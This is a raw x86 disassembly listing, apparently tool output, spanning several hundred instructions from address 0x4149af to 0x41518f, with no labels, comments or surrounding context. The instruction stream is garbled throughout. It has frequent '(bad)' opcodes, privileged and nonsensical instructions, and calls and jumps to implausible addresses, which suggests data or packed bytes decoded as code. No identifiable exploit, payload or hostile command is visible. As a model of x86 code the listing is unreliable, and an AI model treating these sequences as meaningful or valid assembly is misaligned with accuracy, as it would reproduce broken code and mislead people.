  4149af:	or     al,0x72
  4149b1:	add    DWORD PTR [eax],eax
  4149b3:	mov    ebx,0x29c2c1
  4149b8:	inc    ebp
  4149b9:	mov    eax,DWORD PTR [ebx]
  4149bb:	cmp    eax,0x3004d1c
  4149c1:	xbegin 0x66c6d5bb
  4149c7:	clc    
  4149c8:	or     BYTE PTR [ebp+0x45],al
  4149cb:	xor    BYTE PTR ds:0x78b089c,dh
  4149d1:	adc    BYTE PTR [ebp+0x45],cl
  4149d4:	lea    eax,[ebp+0x33727501]
  4149da:	add    cl,ch
  4149dc:	inc    ebp
  4149dd:	add    bl,ch
  4149df:	add    BYTE PTR [ebx+0x45850845],cl
  4149e5:	je     0x414972
  4149e7:	push   ebx
  4149e8:	or     al,0x85
  4149ea:	dec    ebp
  4149eb:	std    
  4149ec:	mov    bh,bh
  4149ee:	mov    BYTE PTR [ebp-0x75],al
  4149f1:	mov    edi,eax
  4149f3:	or     al,0x89
  4149f5:	inc    ebp
  4149f6:	clc    
  4149f7:	mov    esp,esp
  4149f9:	hlt    
  4149fa:	call   DWORD PTR [edi-0x37]
  4149fd:	push   ebp
  4149fe:	or     al,0x51
  414a00:	push   ebp
  414a01:	xor    ebp,esp
  414a03:	mov    esi,0x457251
  414a08:	xor    esi,eax
  414a0a:	pushf  
  414a0b:	inc    ebp
  414a0c:	(bad)  
  414a0d:	mov    edi,eax
  414a0f:	or     al,0x85
  414a11:	add    al,bh
  414a13:	inc    eax
  414a15:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  414a19:	or     ah,bh
  414a1b:	inc    eax
  414a1c:	push   ebp
  414a1d:	jmp    0x414a70
  414a1f:	mov    eax,DWORD PTR ds:0xe8720c
  414a25:	mov    DWORD PTR [ebp-0x8],eax
  414a28:	jne    0x414a6f
  414a2a:	jmp    0x4149b7
  414a2c:	mov    ebp,DWORD PTR [eax]
  414a2e:	clc    
  414a2f:	retf   0xff55
  414a32:	push   ecx
  414a33:	mov    DWORD PTR ds:0x757210,eax
  414a39:	mov    ecx,DWORD PTR [ebp-0x4]
  414a3c:	sub    esp,DWORD PTR [ebx-0x77]
  414a3f:	dec    DWORD PTR [eax*4-0x74ca8abb]
  414a46:	or     ah,bh
  414a48:	pop    es
  414a49:	ds pushf 
  414a4b:	push   DWORD PTR [edx]
  414a4d:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  414a53:	(bad)  
  414a54:	mov    bh,bh
  414a56:	jmp    0x414a44
  414a58:	leave  
  414a59:	jne    0x414a63
  414a5b:	call   0x2e43b5
  414a60:	in     al,dx
  414a61:	dec    ebp
  414a62:	add    dh,BYTE PTR [ebx]
  414a64:	add    BYTE PTR [ebx],al
  414a66:	inc    ebp
  414a67:	cmp    esi,DWORD PTR [ecx]
  414a69:	je     0x414a07
  414a6b:	mov    eax,edi
  414a6d:	or     al,0xf0
  414a6f:	add    BYTE PTR [ebp+0x458bf845],al
  414a75:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  414a7b:	adc    al,0x7
  414a7d:	enter  0x9fc0,0xa5
  414a81:	rol    BYTE PTR [eax],0x5e
  414a84:	mov    ecx,ecx
  414a86:	or     al,0xc
  414a88:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  414a8f:	jmp    0x414a90
  414a91:	push   ebp
  414a92:	mov    esp,ebp
  414a94:	cld    
  414a95:	inc    ebp
  414a96:	inc    ebp
  414a97:	or     DWORD PTR [ecx+0x457dec10],0x0
  414a9e:	push   esi
  414a9f:	push   esi
  414aa0:	mov    edi,0x7af080f
  414aa5:	add    bh,al
  414aa7:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  414aae:	mov    DWORD PTR [edi],ecx
  414ab0:	adc    BYTE PTR [eax+0x45],al
  414ab3:	mov    ebp,eax
  414ab5:	mov    ebp,edi
  414ab7:	lock call edx
  414aba:	fcom   DWORD PTR [ebp+0x45]
  414abd:	mov    eax,0x148a8b
  414ac2:	push   ecx
  414ac3:	enter  0xc145,0x83
  414ac7:	cmp    ecx,DWORD PTR [eax]
  414ac9:	add    BYTE PTR [ebp+0x4d],al
  414acc:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  414ad2:	call   0xffa14641
  414ad7:	cmp    eax,DWORD PTR [ebp-0xc]
  414ada:	jmp    DWORD PTR [eax+edx*1-0x4e]
  414ade:	push   ebp
  414adf:	(bad)  
  414ae0:	call   0x3248e4
  414ae5:	mov    bh,0xdb
  414ae7:	cld    
  414ae8:	or     BYTE PTR [ebp+0x45],bl
  414aeb:	(bad)  
  414aec:	call   0xff7b477c
  414af1:	add    al,BYTE PTR [ebp+0x37]
  414af4:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  414afa:	jne    0x414afc
  414afc:	(bad)  
  414afd:	cmp    edi,esp
  414aff:	jne    0x414b32
  414b01:	mov    edi,edi
  414b03:	or     BYTE PTR [ebx-0x307f0b49],cl
  414b09:	pop    ds
  414b0a:	into   
  414b0b:	je     0x414ace
  414b0d:	mov    ebx,DWORD PTR [esi]
  414b0f:	or     BYTE PTR [ebp-0x49],al
  414b12:	mov    esp,DWORD PTR [esi-0x77]
  414b15:	mov    esi,0x4451f0c
  414b1a:	mov    eax,DWORD PTR [eax]
  414b1c:	or     al,0x66
  414b1e:	sar    bl,0x3b
  414b21:	xor    esi,DWORD PTR [ebp+0x66]
  414b24:	xor    ecx,edi
  414b26:	pop    edi
  414b27:	adc    bl,BYTE PTR [ebx+0x70]
  414b2a:	ret    0xff
  414b2d:	cld    
  414b2e:	inc    ebp
  414b2f:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  414b35:	cld    
  414b36:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  414b3d:	push   0xffffff83
  414b3f:	pop    edi
  414b40:	or     BYTE PTR [ebp+0x53],dh
  414b43:	xorps  xmm1,xmm2
  414b46:	test   BYTE PTR [eax+eax*1],bh
  414b49:	add    BYTE PTR [eax],al
  414b4b:	adc    eax,eax
  414b4d:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  414b55:	jmp    DWORD PTR [eax]
  414b57:	ror    al,0x5e
  414b5a:	inc    ebp
  414b5b:	leave  
  414b5c:	xor    ecx,DWORD PTR [eax]
  414b5e:	and    DWORD PTR [ebx-0x3ec10708],ecx
  414b64:	add    ah,al
  414b66:	xor    edi,edi
  414b68:	xor    DWORD PTR [ebx],0x66003304
  414b6e:	mov    DWORD PTR [ebp-0xc],ecx
  414b71:	pcmpgtw mm0,mm0
  414b74:	add    dl,ah
  414b76:	leave  
  414b77:	mov    edi,DWORD PTR [esi-0x7d]
  414b7a:	push   ax
  414b7c:	dec    ebp
  414b7d:	mov    esi,DWORD PTR [ebx-0x75]
  414b80:	lea    ebp,[eax-0x7c00ff04]
  414b86:	xor    eax,DWORD PTR [eax]
  414b88:	sysret 
  414b8a:	dec    ebp
  414b8b:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  414b92:	push   WORD PTR [ecx+0x8]
  414b96:	jne    0x414b59
  414b98:	ud0    ecx,DWORD PTR [ecx]
  414b9b:	mov    eax,edx
  414b9d:	lods   al,BYTE PTR ds:[esi]
  414b9e:	add    BYTE PTR [eax],al
  414ba0:	data16 (bad) 
  414ba2:	iret   
  414ba3:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  414baa:	cli    
  414bab:	inc    ebp
  414bac:	cmp    al,0x8d
  414bae:	add    BYTE PTR [esi+0x2d],ah
  414bb1:	inc    ebp
  414bb2:	pop    ebp
  414bb3:	lea    ecx,[edi]
  414bb5:	mov    dl,bh
  414bb7:	add    BYTE PTR [edi],cl
  414bb9:	mov    DWORD PTR [eax+eax*8],edi
  414bbc:	mov    ebx,0x3b87
  414bc1:	add    BYTE PTR [ebx],ch
  414bc3:	inc    ebp
  414bc4:	data16 (bad) 
  414bc6:	clc    
  414bc7:	int3   
  414bc8:	cmp    eax,DWORD PTR [eax]
  414bca:	je     0x414b55
  414bcc:	push   0xffffffc8
  414bce:	pop    edi
  414bcf:	xchg   DWORD PTR [ebp+0x0],eax
  414bd2:	data16 add BYTE PTR [ebp+0x45],cl
  414bd6:	lea    cx,[ebp+0x10]
  414bda:	jb     0x414bdc
  414bdc:	jmp    0x414b67
  414bde:	call   eax
  414be0:	clc    
  414be1:	xchg   DWORD PTR [edi+0x1],edi
  414be4:	mov    eax,DWORD PTR [eax]
  414be6:	or     BYTE PTR [ebp-0x49],al
  414be9:	lea    eax,[eax+0x74003154]
  414bef:	push   edi
  414bf0:	inc    edx
  414bf1:	jge    0x414bf2
  414bf3:	mov    DWORD PTR [edi],ecx
  414bf5:	fdiv   DWORD PTR [edi-0x6]
  414bf8:	inc    DWORD PTR [eax]
  414bfa:	xor    edx,DWORD PTR [eax+0x5f]
  414bfd:	xchg   DWORD PTR [ebx+0x1],ebx
  414c00:	ret    0x0
  414c03:	xor    BYTE PTR [ebp-0x51],cl
  414c06:	cmp    edi,0xf0ff89fc
  414c0c:	data16 ror al,0x84
  414c10:	rol    BYTE PTR [eax],0x3b
  414c13:	add    al,dh
  414c15:	dec    eax
  414c16:	xchg   esp,eax
  414c17:	push   ebx
  414c18:	jmp    0x414ba5
  414c1a:	push   ebp
  414c1b:	add    esp,ebp
  414c1d:	add    ebp,esp
  414c1f:	mov    edx,DWORD PTR [edi+0x24]
  414c22:	clc    
  414c23:	dec    esi
  414c24:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  414c2a:	cmp    BYTE PTR [ebx],al
  414c2c:	jne    0x414bb7
  414c2e:	xor    esp,eax
  414c30:	jmp    0x444db3
  414c35:	add    ebp,DWORD PTR [ecx+ecx*4]
  414c38:	jne    0x414c2e
  414c3a:	call   0xffcb4994
  414c3f:	clc    
  414c40:	xchg   edi,eax
  414c41:	sti    
  414c42:	add    DWORD PTR [ebx],eax
  414c44:	add    BYTE PTR [ebp+0x47],bl
  414c47:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  414c4d:	pop    ebp
  414c4e:	mov    DWORD PTR [esi-0x48],esi
  414c51:	jmp    0x414c9a
  414c53:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  414c59:	(bad)  
  414c5b:	cmp    al,0x0
  414c5d:	cmp    eax,DWORD PTR [ebp+0x18]
  414c60:	lea    ebx,[ebp-0x56]
  414c63:	jle    0x414c65
  414c65:	jae    0x414bf0
  414c67:	mov    eax,esp
  414c69:	call   0xb900:0x8b005587
  414c70:	inc    ebp
  414c71:	push   ebp
  414c72:	lea    ecx,[ebp-0x27ff4f12]
  414c78:	mov    eax,edi
  414c7a:	int3   
  414c7b:	push   ebp
  414c7c:	xchg   edi,eax
  414c7e:	add    esp,ebp
  414c80:	add    BYTE PTR [eax],al
  414c82:	inc    ebp
  414c83:	add    BYTE PTR [ebp+0x8b3255],cl
  414c89:	cld    
  414c8a:	mov    DWORD PTR [edx],edi
  414c8c:	aam    0x75
  414c8e:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  414c94:	mov    DWORD PTR [ebx-0x50],edx
  414c97:	test   BYTE PTR [ebp-0x1],0xe8
  414c9b:	mov    eax,DWORD PTR [eax]
  414c9d:	hlt    
  414c9e:	add    al,al
  414ca0:	mov    eax,DWORD PTR ds:0x890045a8
  414ca6:	dec    DWORD PTR [ebx+0x45fdf0e8]
  414cac:	inc    DWORD PTR [eax*2+0xf75854d]
  414cb3:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  414cb9:	call   0x7297a9fa
  414cbe:	je     0x414d1e
  414cc0:	js     0x414d21
  414cc2:	lock ret 0x7e
  414cc6:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  414ccc:	mov    edi,edi
  414cce:	sbb    al,bl
  414cd0:	clc    
  414cd1:	add    BYTE PTR [ebp-0x73],bh
  414cd4:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  414cda:	ror    BYTE PTR [eax],1
  414cdc:	dec    ebp
  414cdd:	xchg   ebp,eax
  414cde:	mov    edi,edi
  414ce0:	in     al,0x8b
  414ce2:	jge    0x414c6d
  414ce4:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  414cea:	clc    
  414ceb:	pop    esi
  414cec:	fist   DWORD PTR [ebp+0x5d398b5d]
  414cf2:	clc    
  414cf3:	add    al,0x6e
  414cf5:	mov    eax,DWORD PTR [ebx]
  414cf7:	mov    BYTE PTR [ebp+0x0],dl
  414cfa:	mov    edx,DWORD PTR [ebx-0x20]
  414cfd:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  414d03:	add    eax,0x3b3b73
  414d08:	adc    al,0x89
  414d0a:	pop    eax
  414d0b:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  414d0f:	ret    0xf08
  414d12:	cmp    al,0x2
  414d14:	mov    edx,eax
  414d16:	cld    
  414d17:	add    BYTE PTR [ebp+0x66],dl
  414d1a:	add    eax,ebx
  414d1c:	add    esp,eax
  414d1e:	sub    eax,eax
  414d20:	or     BYTE PTR [ecx-0x77f474bb],cl
  414d26:	add    BYTE PTR [eax],al
  414d28:	mov    DWORD PTR [ebx-0x24],ebx
  414d2b:	push   edi
  414d2c:	push   ebp
  414d2d:	clc    
  414d2e:	add    DWORD PTR [esi+0x1b0100],0x45
  414d35:	out    0xff,eax
  414d37:	add    edx,DWORD PTR [eax]
  414d39:	jmp    0x414d23
  414d3b:	cmp    ch,0x47
  414d3e:	(bad)  
  414d3f:	jmp    0x40c6d591
  414d44:	je     0x414cd0
  414d46:	mov    eax,DWORD PTR [eax-0x10c78f04]
  414d4c:	inc    ebp
  414d4d:	add    BYTE PTR [ebx-0x770375],al
  414d53:	add    ah,ch
  414d55:	add    edx,esp
  414d57:	pop    edi
  414d58:	pop    ebp
  414d59:	push   ebp
  414d5a:	inc    ebx
  414d5b:	in     al,dx
  414d5c:	pop    ebp
  414d5d:	in     al,dx
  414d5e:	cmp    edx,DWORD PTR [edi-0x8]
  414d61:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  414d68:	add    al,0x47
  414d6a:	push   ebp
  414d6b:	mov    esp,ebp
  414d6d:	in     al,0x45
  414d6f:	dec    ebp
  414d70:	push   esi
  414d71:	test   DWORD PTR [eax+0xfb010f],esi
  414d77:	add    BYTE PTR [eax+0xc018b],dh
  414d7d:	leave  
  414d7e:	inc    ebp
  414d7f:	test   al,ch
  414d81:	add    dh,bh
  414d83:	add    bh,bh
  414d85:	dec    ebp
  414d86:	push   cs
  414d87:	mov    DWORD PTR [ecx],eax
  414d89:	hlt    
  414d8a:	push   es
  414d8b:	dec    ebp
  414d8c:	leave  
  414d8d:	mov    DWORD PTR [eax],ecx
  414d8f:	clc    
  414d90:	cmovge eax,ecx
  414d93:	mov    ecx,0x85c2f0
  414d99:	clc    
  414d9a:	pop    DWORD PTR [ebp+0x1]
  414d9d:	push   ebx
  414d9e:	add    BYTE PTR [ebp-0x15],bh
  414da1:	push   esi
  414da2:	xor    eax,0x898a45
  414da7:	cld    
  414da8:	add    al,0x45
  414daa:	add    BYTE PTR [ebx],dh
  414dac:	pushfw 
  414dae:	add    DWORD PTR [esi+0x78308c1],edi
  414db4:	add    ah,BYTE PTR [edi+esi*4-0x33]
  414db8:	mov    ebx,0xc4e8b
  414dbd:	(bad)  
  414dbe:	cmp    ecx,ebx
  414dc0:	jne    0x414d8a
  414dc2:	xor    ecx,DWORD PTR [ebp+0x66]
  414dc5:	jmp    0xc84dcb
  414dca:	add    DWORD PTR [ebp+0x0],eax
  414dcd:	mov    eax,ebx
  414dcf:	or     al,0x8b
  414dd1:	(bad)  
  414dd2:	mov    ecx,esi
  414dd4:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  414ddb:	mov    eax,edi
  414ddd:	or     BYTE PTR [edx],cl
  414ddf:	shl    cl,cl
  414de1:	icebp  
  414de2:	add    BYTE PTR [ebp+0x37],0x8b
  414de6:	or     BYTE PTR [edx+eax*2],cl
  414de9:	(bad)  
  414dea:	or     cl,dh
  414dec:	stc    
  414ded:	shl    DWORD PTR [ebp-0x30],0xc6
  414df1:	xor    al,0x0
  414df3:	inc    ebp
  414df4:	xchg   BYTE PTR [ebx],al
  414df6:	add    esp,edi
  414df8:	add    BYTE PTR [ebp-0x39],cl
  414dfb:	mov    al,bl
  414dfd:	test   DWORD PTR [ebx+0x1c348375],ecx
  414e03:	sub    al,0xbf
  414e05:	jmp    0x414d8c
  414e07:	mov    edi,eax
  414e09:	lock jge 0x414dfd
  414e0c:	lea    esi,[edx-0x74bad501]
  414e12:	mov    ebp,esp
  414e14:	or     cl,dh
  414e16:	leave  
  414e17:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  414e1e:	dec    ebp
  414e1f:	dec    ebp
  414e20:	test   DWORD PTR [ebx],eax
  414e22:	paddb  mm6,mm0
  414e25:	add    DWORD PTR [eax],eax
  414e27:	dec    ebp
  414e28:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  414e2e:	mov    esi,DWORD PTR [edx]
  414e30:	or     al,0x2b
  414e32:	dec    ebp
  414e33:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  414e39:	mov    esp,esi
  414e3b:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  414e42:	mov    DWORD PTR [ebx],ebp
  414e44:	call   0xc74d774
  414e49:	mov    DWORD PTR [ebp+0x10],ecx
  414e4c:	(bad)  
  414e4d:	push   0x8b85ff10
  414e52:	clc    
  414e53:	or     al,0x55
  414e55:	(bad)  
  414e56:	push   ecx
  414e57:	retf   
  414e58:	mov    ebx,0xff4d8dc8
  414e5d:	mov    DWORD PTR [ebp+0x8],eax
  414e60:	xor    eax,DWORD PTR [ebp-0x75]
  414e63:	cmp    ebp,DWORD PTR [ebx]
  414e65:	lsl    ebx,WORD PTR [edi-0x8]
  414e69:	call   DWORD PTR [ebx-0x741bff75]
  414e6f:	(bad)  
  414e70:	or     al,0x5b
  414e72:	dec    ebp
  414e73:	or     BYTE PTR [ebx],dh
  414e75:	inc    ebp
  414e76:	xor    esi,DWORD PTR ds:0x708088d
  414e7c:	in     eax,0x9c
  414e7e:	add    BYTE PTR [edx],dh
  414e80:	inc    ebp
  414e81:	pop    edi
  414e82:	xor    eax,edx
  414e84:	test   DWORD PTR [eax],0x83108b8b
  414e8a:	dec    ebp
  414e8b:	adc    al,0x33
  414e8d:	inc    ebp
  414e8e:	xor    esi,DWORD PTR [ecx]
  414e90:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  414e97:	test   DWORD PTR [eax],ecx
  414e99:	clc    
  414e9a:	inc    ebp
  414e9b:	add    ecx,DWORD PTR [ebx+0xc7f445]
  414ea1:	hlt    
  414ea2:	leave  
  414ea3:	test   DWORD PTR [esi],eax
  414ea5:	clc    
  414ea6:	inc    edi
  414ea7:	push   edi
  414ea8:	aaa    
  414ea9:	inc    ebp
  414eaa:	pop    ss
  414eab:	ror    DWORD PTR [ebp-0x29],1
  414eae:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  414eb5:	mov    eax,0x780084d
  414eba:	push   ebp
  414ebb:	clc    
  414ebc:	ret    0xe99c
  414ebf:	xor    dl,dl
  414ec1:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  414ec7:	js     0x887dac6
  414ecd:	dec    ebp
  414ece:	push   ebp
  414ecf:	mov    edi,DWORD PTR [eax+0xc872fc]
  414ed5:	lock enter 0xceca,0xf2
  414eda:	retf   0x18ce
  414edd:	jne    0x414f2c
  414edf:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  414ee5:	enter  0xf0d6,0xca
  414ee9:	retf   0xf2c8
  414eec:	into   
  414eed:	out    dx,al
  414eee:	dec    ebp
  414eef:	dec    ebp
  414ef0:	jmp    0xff454e28
  414ef5:	xor    eax,DWORD PTR [ebp-0x15]
  414ef8:	xor    esi,DWORD PTR [ebx]
  414efa:	mov    esi,DWORD PTR [ebx]
  414efc:	sub    eax,DWORD PTR [ebx]
  414efe:	add    eax,DWORD PTR [ebx]
  414f00:	or     bl,dl
  414f02:	dec    ebp
  414f03:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  414f09:	xor    eax,DWORD PTR [ebp-0xf00073]
  414f0f:	jb     0x414f56
  414f11:	add    BYTE PTR [ebx],dh
  414f13:	dec    ebp
  414f14:	pop    esi
  414f15:	mov    ebp,ebx
  414f17:	cld    
  414f18:	mov    esi,eax
  414f1a:	call   0x520fa4e7
  414f1f:	stc    
  414f20:	add    eax,0x4572aa
  414f25:	pop    edi
  414f26:	leave  
  414f27:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  414f2e:	in     al,dx
  414f2f:	mov    eax,edi
  414f31:	xor    eax,0xf8008520
  414f37:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  414f3e:	mov    eax,DWORD PTR [ebp-0x77]
  414f41:	xor    al,bh
  414f43:	pushf  
  414f44:	inc    ebp
  414f45:	(bad)  
  414f46:	cmp    eax,ebp
  414f48:	pushf  
  414f49:	xchg   BYTE PTR [esi-0x8],dl
  414f4c:	mov    edi,0x8518e4ec
  414f52:	jmp    0xf056:0x8b457df8
  414f59:	push   ebp
  414f5a:	push   ebp
  414f5b:	push   ecx
  414f5c:	push   ecx
  414f5d:	push   edi
  414f5e:	xor    eax,esi
  414f60:	mov    edx,0x32729c
  414f65:	add    ecx,eax
  414f67:	mov    edx,edi
  414f69:	clc    
  414f6a:	retf   0xaf45
  414f6d:	cmp    ebx,ebp
  414f6f:	pushf  
  414f70:	mov    eax,edi
  414f72:	clc    
  414f73:	cld    
  414f74:	jne    0x414f8e
  414f76:	xor    ebp,edx
  414f78:	xor    eax,DWORD PTR [ebp+0x3]
  414f7b:	or     BYTE PTR [ebx],al
  414f7d:	add    BYTE PTR [ebp-0x7747475],al
  414f83:	hlt    
  414f84:	dec    ebp
  414f85:	dec    ebp
  414f86:	je     0x414fbb
  414f88:	xor    esi,DWORD PTR [ebx]
  414f8a:	xor    eax,DWORD PTR [ebx]
  414f8c:	add    eax,DWORD PTR [ebx]
  414f8e:	add    ecx,DWORD PTR [edi]
  414f90:	rol    ecx,cl
  414f92:	mov    esi,DWORD PTR [ecx]
  414f94:	in     al,dx
  414f95:	inc    ebp
  414f96:	enter  0xca2b,0x33
  414f9a:	icebp  
  414f9b:	mov    DWORD PTR [edx],ecx
  414f9d:	clc    
  414f9e:	lock pop ebp
  414fa0:	enter  0xf2e8,0xfe
  414fa4:	retf   0xeeff
  414fa7:	inc    ebp
  414fa8:	jne    0x414f35
  414faa:	mov    edi,eax
  414fac:	cld    
  414fad:	dec    ebp
  414fae:	enter  0xbc89,0x8d
  414fb2:	pushf  
  414fb3:	sti    
  414fb4:	xor    bh,bh
  414fb6:	mov    eax,DWORD PTR [ebp-0xc]
  414fb9:	mov    esi,DWORD PTR [ebp-0x4]
  414fbc:	xor    eax,esi
  414fbe:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  414fc5:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  414fcb:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  414fd1:	(bad)  
  414fd2:	push   ebp
  414fd3:	shr    esp,0x4d
  414fd6:	in     al,dx
  414fd7:	cmp    eax,DWORD PTR [esi+esi*2]
  414fda:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  414fe0:	pushf  
  414fe1:	mov    edi,0x85c7f445
  414fe7:	call   0xf886d6e4
  414fec:	xor    ebx,ebx
  414fee:	pushf  
  414fef:	popa   
  414ff0:	push   ebx
  414ff1:	dec    ebp
  414ff2:	inc    ebp
  414ff3:	mov    esi,DWORD PTR [esi]
  414ff5:	clc    
  414ff6:	pushf  
  414ff7:	into   
  414ff8:	mov    ecx,edi
  414ffa:	in     al,dx
  414ffb:	call   0x8b4995be
  415000:	pop    es
  415001:	or     BYTE PTR [ebx],dh
  415003:	or     BYTE PTR [edi+0x8a724d],bh
  415009:	or     eax,edi
  41500b:	push   ebp
  41500c:	inc    ebp
  41500d:	cmpxchg8b (bad)
  41500e:	(bad)  
  41500f:	leave  
  415010:	loopne 0x414fdc
  415012:	test   DWORD PTR [ebp-0x8],ecx
  415015:	mov    eax,DWORD PTR [ebp-0x18]
  415018:	rcl    DWORD PTR [ebp-0x29],1
  41501b:	xor    eax,edi
  41501d:	add    esi,eax
  41501f:	and    eax,DWORD PTR [eax]
  415021:	mov    eax,DWORD PTR [eax]
  415023:	(bad)  
  415024:	leave  
  415025:	sti    
  415026:	inc    ebp
  415027:	dec    DWORD PTR [ebx-0x39cc13ab]
  41502d:	mov    esi,ecx
  41502f:	clc    
  415030:	(bad)  
  415031:	dec    ebp
  415032:	iret   
  415033:	xor    ebp,DWORD PTR [edi-0x74f71473]
  415039:	jb     0x415037
  41503b:	add    bh,al
  41503d:	inc    ebp
  41503e:	(bad)  
  41503f:	mov    eax,DWORD PTR [ebp-0xc]
  415042:	(bad)  
  415043:	xabort 0x64
  415046:	loopne 0x415015
  415048:	jmp    FWORD PTR [ebx]
  41504a:	mov    DWORD PTR [ebx],eax
  41504c:	clc    
  41504d:	lock inc ebp
  41504f:	dec    ebp
  415050:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  415056:	loopne 0x41508b
  415058:	inc    DWORD PTR [ebx]
  41505a:	mov    edi,DWORD PTR [ebx]
  41505c:	hlt    
  41505d:	jne    0x4150ac
  41505f:	mov    esi,DWORD PTR [ebx]
  415061:	in     al,0x8d
  415063:	dec    ebp
  415064:	or     BYTE PTR [ebx],dh
  415066:	jb     0x41506b
  415068:	add    BYTE PTR [edi+0x45],bl
  41506b:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  415071:	add    BYTE PTR [ebx],dh
  415073:	mov    esi,DWORD PTR [ebx]
  415075:	sub    DWORD PTR [ebx],0x6c
  415078:	mov    eax,DWORD PTR [ebp-0x4]
  41507b:	xor    eax,ecx
  41507d:	pushf  
  41507e:	mov    ecx,0x338545ba
  415083:	clc    
  415084:	add    edx,DWORD PTR [ebp-0x77]
  415087:	mov    edi,eax
  415089:	adc    al,0x45
  41508b:	inc    ebp
  41508c:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  415094:	mov    eax,DWORD PTR [eax]
  415096:	loopne 0x4150e5
  415098:	inc    ebp
  415099:	mov    esi,DWORD PTR [ebx]
  41509b:	mov    eax,DWORD PTR [ebx]
  41509d:	nop
  41509e:	rol    DWORD PTR [eax],cl
  4150a0:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  4150a6:	mov    cl,BYTE PTR [ecx+0x450bf888]
  4150ac:	dec    ebp
  4150ad:	push   esi
  4150ae:	mov    edi,DWORD PTR [edi+0x7b608f8]
  4150b4:	xor    eax,edi
  4150b6:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  4150bd:	mov    DWORD PTR [eax],ecx
  4150bf:	in     al,dx
  4150c0:	into   
  4150c1:	inc    ebp
  4150c2:	iret   
  4150c3:	xor    ecx,edx
  4150c5:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  4150cc:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  4150d2:	dec    ebp
  4150d3:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  4150d9:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  4150e0:	mov    DWORD PTR [ecx+0x8],eax
  4150e3:	mov    eax,DWORD PTR [ebp-0x8]
  4150e6:	xor    ebx,DWORD PTR [eax]
  4150e8:	mov    ecx,0xff8b8d40
  4150ed:	clc    
  4150ee:	enter  0x4d49,0x48
  4150f2:	mov    eax,edx
  4150f4:	lock enter 0x4545,0x8b
  4150f9:	mov    esi,eax
  4150fb:	cmp    dh,al
  4150fd:	rol    edi,0x3
  415100:	enter  0x9140,0x89
  415104:	inc    ebp
  415105:	adc    al,0x8b
  415107:	inc    ebp
  415108:	clc    
  415109:	xor    eax,esi
  41510b:	add    eax,edi
  41510d:	mov    DWORD PTR [esi-0x24],ebx
  415110:	rol    DWORD PTR [ebp-0x37],0x33
  415114:	add    al,0x3
  415116:	push   ebp
  415117:	mov    esp,ebp
  415119:	fsubr  st,st(4)
  41511b:	inc    ebp
  41511c:	(bad)  
  41511d:	mov    edi,esp
  41511f:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  415125:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41512c:	inc    ebp
  41512d:	test   DWORD PTR [ecx+0x454514f8],ecx
  415133:	xor    cl,BYTE PTR [ebx+0xc7909c]
  415139:	fmul   DWORD PTR [ebx+0xf81485]
  41513f:	test   DWORD PTR [ecx+0x8b0100],ecx
  415145:	cld    
  415146:	or     edi,eax
  415148:	dec    eax
  415149:	ret    
  41514a:	push   ebx
  41514b:	inc    ebp
  41514c:	dec    ebp
  41514d:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  415153:	mov    DWORD PTR [ebp-0x14],edx
  415156:	push   ecx
  415157:	jne    0x41518c
  415159:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41515f:	call   0xff874327
  415164:	mov    eax,DWORD PTR [ebp-0x4]
  415167:	mov    edi,0x4585c3d8
  41516d:	clc    
  41516e:	mov    eax,DWORD PTR [ebp-0x8]
  415171:	xor    eax,DWORD PTR [eax+0x3]
  415174:	adc    DWORD PTR [eax+0xc],0x45
  415178:	inc    ebp
  415179:	push   eax
  41517a:	mov    ebx,ebp
  41517c:	clc    
  41517d:	inc    DWORD PTR [eax-0x75]
  415180:	mov    esi,eax
  415182:	clc    
  415183:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41518a:	je     0x41518f
  41518c:	mov    edx,DWORD PTR [eax+0x38]
  41518f:	jne    0x4151de
